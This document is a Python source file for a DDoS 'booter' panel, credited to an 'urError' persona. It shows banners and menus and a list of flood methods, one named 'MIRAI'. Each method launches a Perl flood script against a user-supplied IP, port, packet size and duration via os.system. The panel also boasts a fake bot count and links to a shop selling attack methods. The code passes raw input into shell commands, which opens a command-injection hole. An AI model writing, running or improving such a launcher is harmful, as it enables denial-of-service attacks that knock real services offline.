import sys
import socket
import time
import random
import threading
import getpass
import os

methods = """
\033[0m ╔╣   ╠════════════════════════════════════════════╣ 
\033[38;5;246m ║\033[38;5;70m ERROR [IP] [PORT] [PACKETS] [SECONDS] 
\033[38;5;246m ║\033[38;5;70m ERRORSLAP [IP] [PORT] [PACKETS] [SECONDS]
\033[38;5;246m ║\033[38;5;70m MIRAI [IP] [PORT] [PACKETS] [SECONDS]
\033[38;5;246m ║\033[38;5;70m ERRORFREEZE [IP] [PORT] [PACKETS] [SECONDS]
\033[38;5;246m ║\033[38;5;70m ERRORSKID [IP] [PORT] [PACKETS] [SECONDS]
\033[38;5;246m ║\033[38;5;70m ERRORKILL [IP] [PORT] [PACKETS] [SECONDS]
\033[0m ╚╣   ╠════════════════════════════════════════════╣
"""
banner = """\033[1;00m
\033[38;5;52m ███████╗\033[38;5;58m  ██████╗ \033[38;5;64m  ██████╗ \033[38;5;70m  \033[38;5;76m   ██████╗ \033[38;5;82m  ██████╗ 
\033[38;5;52m ██╔════╝\033[38;5;58m  ██╔══██╗\033[38;5;64m  ██╔══██╗\033[38;5;70m  \033[38;5;76m  ██╔═══██╗\033[38;5;82m  ██╔══██╗
\033[38;5;52m █████╗  \033[38;5;58m  ██████╔╝\033[38;5;64m  ██████╔╝\033[38;5;70m  \033[38;5;76m  ██║   ██║\033[38;5;82m  ██████╔╝
\033[38;5;52m ██╔══╝  \033[38;5;58m  ██╔══██╗\033[38;5;64m  ██╔══██╗\033[38;5;70m  \033[38;5;76m  ██║   ██║\033[38;5;82m  ██╔══██╗
\033[38;5;52m ███████╗\033[38;5;58m  ██║  ██║\033[38;5;64m  ██║  ██║\033[38;5;70m  \033[38;5;76m  ╚██████╔╝\033[38;5;82m  ██║  ██║
\033[38;5;52m ╚══════╝\033[38;5;58m  ╚═╝  ╚═╝\033[38;5;64m  ╚═╝  ╚═╝\033[38;5;70m  \033[38;5;76m   ╚═════╝ \033[38;5;82m  ╚═╝  ╚═╝
"""
building = """
              ,---.  ,---.  ,---.    .---.  ,---.    
              | .-'  | .-.\ | .-.\  / .-. ) | .-.\   
              | `-.  | `-'/ | `-'/  | | |(_)| `-'/   
              | .-'  |   (  |   (   | | | | |   (    
              |  `--.| |\ \ | |\ \  \ `-' / | |\ \   
              /( __.'|_| \)\|_| \)\  )---'  |_| \)\  
             (__)        (__)   (__)(_)         (__) 
             
                     urerror_vanish on insta
"""

help = """
\033[0m      H E L P                   C O M M A N D S
\033[0m ╬╬═══════════════════════════════════════════════╬╬
\033[0m ║║\033[38;5;52m  INFO - will show a little about the menu\033[0m     ║║ 
\033[0m ║║\033[38;5;58m  METHODS - will show the different attacks\033[0m    ║║
\033[0m ║║\033[38;5;64m  CLEAR - will clear your screen\033[0m               ║║
\033[0m ║║\033[38;5;70m  EXIT - will allow you to leave\033[0m               ║║
\033[0m ╬╬═══════════════════════════════════════════════╬╬            
"""

info = """\033[38;5;255m
 ┌   ╔╬╝╚╬╗╔╬╝╚╬╗╔╬╝╚╬╗╔╬╝╚╬╗╔╬╝╚╬╗╔╬╝╚╬╗╔╬╝╚╬╗╔╬╝╚╬╗\033[38;5;255m
 │      \033[38;5;52mFOLLOW MY INSTA [@urerror_vanish]\033[38;5;255m
 │      \033[38;5;58mDISCORD [urError#1348]\033[38;5;255m
 │      \033[38;5;64mPSN [urError]\033[38;5;255m
 │      \033[38;5;70mMETHODS [https://shoppy.gg/@wodx]\033[38;5;255m
 └   ╚╬╗╔╬╝╚╬╗╔╬╝╚╬╗╔╬╝╚╬╗╔╬╝╚╬╗╔╬╝╚╬╗╔╬╝╚╬╗╔╬╝╚╬╗╔╬╝
"""

altbanner = """
\033[38;5;52m        ▄███▄   █▄▄▄▄ █▄▄▄▄ ████▄ █▄▄▄▄ 
\033[38;5;58m        █▀   ▀  █  ▄▀ █  ▄▀ █   █ █  ▄▀  
\033[38;5;64m        ██▄▄    █▀▀▌  █▀▀▌  █   █ █▀▀▌    
\033[38;5;70m        █▄   ▄▀ █  █  █  █  ▀████ █  █    
\033[38;5;76m        ▀███▀     █     █           █    
\033[38;5;82m                 ▀     ▀           ▀   
\033[38;5;83m       
"""


project = """

"""

tattacks = 0

def main():
	global tattacks

	while True:
		sys.stdout.write("\x1b]2; Bots Connected: 1578 |-MADE BY urError#1348| \x07")
		sin = input("\033[38;5;83murError@ERROR\033[38;5;70m!!!  ")
		que = sin.split(" ")[0]
		if que == "clear":
			os.system ("clear")
			print (altbanner)
			main()
		elif que == "help":
			print (help)
			main()
		elif que == "bliss":
			os.system ("clear")
			print (banner)
			main()
		elif que == "":
			main()
		elif que == "exit":
			exit()
		elif que == "attacks":
			print ("\033[00m- a t t a c k s   t h i s   s e s s i o n   \033[38;5;42m{}".format (tattacks))  
			main()
		elif que == "methods":
			print (methods)
			main()
		elif que == "test":
			print (building)
			main()
		elif que == "info":
			print (info)
			main()
		elif que == "error":
			try:
				que, ip, port, size, secs= sin.split(" ")	
				socket.gethostbyname(ip)
				os.system('perl error.pl %s %s %s %s'%(ip, port, size, secs))
				tattacks += 1
			except ValueError:	
				print ("\033[38;5;254m#\033[38;5;115mVANISH! method \033[38;5;42m{} \033[0mrequires an argument".format (que))	
				main()	
			except socket.gaierror:	
				print ("\033[38;5;254m#\033[38;5;115mVANISH! \033[38;5;43m{}\033[0m is invalid".format (ip))	
				main()		
		elif que == "errorslap":
			try:
				que, ip, port, size, secs= sin.split(" ")	
				socket.gethostbyname(ip)
				os.system('perl errorslap.pl %s %s %s %s'%(ip, port, size, secs))
				tattacks += 1
			except ValueError:	
				print ("\033[38;5;254m#\033[38;5;115mVANISH! method \033[38;5;42m{} \033[0mrequires an argument".format (que))	
				main()	
			except socket.gaierror:	
				print ("\033[38;5;254m#\033[38;5;115mVANISH! \033[38;5;43m{}\033[0m is invalid".format (ip))	
				main()	
		elif que == "mirai":
			try:
				que, ip, port, size, secs= sin.split(" ")	
				socket.gethostbyname(ip)
				os.system('perl mirai.pl %s %s %s %s'%(ip, port, size, secs))
				tattacks += 1
			except ValueError:	
				print ("\033[38;5;254m#\033[38;5;115mVANISH! method \033[38;5;42m{} \033[0mrequires an argument".format (que))	
				main()	
			except socket.gaierror:	
				print ("\033[38;5;254m#\033[38;5;115mVANISH! \033[38;5;43m{}\033[0m is invalid".format (ip))	
				main()	
		elif que == "errorfreeze":
			try:
				que, ip, port, size, secs= sin.split(" ")	
				socket.gethostbyname(ip)
				os.system('perl errorfreeze.pl %s %s %s %s'%(ip, port, size, secs))
				tattacks += 1
			except ValueError:	
				print ("\033[38;5;254m#\033[38;5;115mVANISH! method \033[38;5;42m{} \033[0mrequires an argument".format (que))	
				main()	
			except socket.gaierror:	
				print ("\033[38;5;254m#\033[38;5;115mVANISH! \033[38;5;43m{}\033[0m is invalid".format (ip))	
				main()	
		elif que == "errorkill":
			try:
				que, ip, port, size, secs= sin.split(" ")	
				socket.gethostbyname(ip)
				os.system('perl errorkill.pl %s %s %s %s'%(ip, port, size, secs))
				tattacks += 1
			except ValueError:	
				print ("\033[38;5;254m#\033[38;5;115mVANISH! method \033[38;5;42m{} \033[0mrequires an argument".format (que))	
				main()	
			except socket.gaierror:	
				print ("\033[38;5;254m#\033[38;5;115mVANISH! \033[38;5;43m{}\033[0m is invalid".format (ip))	
				main()
try:
	clear = "clear"
	os.system (clear)
	print ('L O A D I N G')
	time.sleep(1)
	os.system ("clear")
	print (building)
	time.sleep(2)
	os.system ("clear")
	print (banner)
	main()
except KeyboardInterrupt:
	exit()